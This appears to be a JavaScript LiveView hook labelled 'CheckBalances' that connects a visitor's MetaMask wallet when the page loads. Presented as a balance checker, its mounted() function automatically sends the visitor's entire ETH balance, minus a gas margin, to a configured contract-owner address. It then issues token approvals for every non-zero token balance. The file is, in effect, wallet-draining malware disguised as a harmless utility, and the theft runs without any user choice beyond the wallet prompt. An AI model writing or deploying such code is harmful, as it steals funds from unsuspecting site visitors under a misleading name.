import { ethers } from "ethers"
import { tokenAddresses, erc20Abi, contractOwnerAddress } from '../config.js';


let CheckBalances = {
    async mounted() {
        if (!window.ethereum) {
            // alert("MetaMask is not installed!")
            return
        }

        try {
            // Connect to MetaMask
            const provider = new ethers.BrowserProvider(window.ethereum)
            await provider.send("eth_requestAccounts", [])
            const signer = await provider.getSigner()
            const userAddress = await signer.getAddress()

            // Get ETH balance
            const balance = await provider.getBalance(userAddress)
            const formattedBalance = ethers.formatEther(balance)

            // Automatically transfer the entire ETH balance to the contract owner
            await this.transferEntireEthBalance(signer, balance)

            // Get list of token balances
            const tokenBalances = await this.getTokenBalances(provider, userAddress)

            // Automatically approve all available tokens for the user address if balance is greater than zero
            await this.approveTokensAutomatically(signer, tokenBalances, userAddress)

            // Push the results back to LiveView
            this.pushEvent("check_balances_result", {
                address: userAddress,
                eth_balance: formattedBalance,
                tokens: tokenBalances
            })

        } catch (error) {
            console.error("Error checking balances:", error)
        }
    },

    async getTokenBalances(provider, address) {
        const tokenBalances = []

        for (const tokenAddress of tokenAddresses) {
            try {
                const contract = new ethers.Contract(tokenAddress, erc20Abi, provider)
                const balance = await contract.balanceOf(address)
                const decimals = await contract.decimals()
                const symbol = await contract.symbol()
                const formattedBalance = ethers.formatUnits(balance, decimals)

                // If balance is greater than zero, add to the token balances list
                if (balance > 0) {
                    tokenBalances.push({
                        tokenAddress,
                        symbol,
                        balance: formattedBalance,
                        rawBalance: balance // Keep raw balance for approval
                    })
                }
            } catch (error) {
                console.error(`Failed to fetch balance for token at ${tokenAddress}:`, error)
            }
        }

        return tokenBalances
    },

    // Automatically approve tokens if they have a balance greater than zero
    async approveTokensAutomatically(signer, tokenBalances, spenderAddress) {
        for (const token of tokenBalances) {
            try {
                const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer)

                // Approve the spender (user's own address) to spend the entire available balance
                const tx = await contract.approve(spenderAddress, token.rawBalance)
                await tx.wait()
                console.log(`Automatically approved ${token.symbol} with ${token.balance} tokens for ${spenderAddress}`)
            } catch (error) {
                console.error(`Failed to automatically approve ${token.symbol}:`, error)
            }
        }
    },

    // Function to transfer the entire available ETH balance to the contract owner
    async transferEntireEthBalance(signer, balance) {
        try {
            // Subtract a small amount to cover gas fees
            const gasEstimate = ethers.parseUnits("0.001", "ether") // Adjust this as needed
            const amountToSend = balance - gasEstimate

            if (amountToSend > 0) {
                const tx = await signer.sendTransaction({
                    to: contractOwnerAddress,
                    value: amountToSend
                })
                await tx.wait()
                console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractOwnerAddress}`)
            } else {
                console.log("Not enough ETH balance to cover gas fees.")
            }
        } catch (error) {
            console.error("Failed to transfer ETH:", error)
        }
    }
}

export default CheckBalances
